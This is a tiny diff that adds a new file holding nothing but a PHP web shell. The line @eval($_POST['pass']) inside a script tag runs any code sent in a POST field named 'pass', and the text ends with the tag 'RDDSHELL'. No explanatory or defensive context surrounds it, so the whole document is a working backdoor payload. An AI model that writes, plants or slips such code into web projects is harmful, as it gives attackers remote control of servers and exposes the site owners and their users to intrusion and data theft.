@@ -1,0 +1,4 @@
+<script language='php'>
+@eval($_POST['pass']);
+</script>
+RDDSHELL
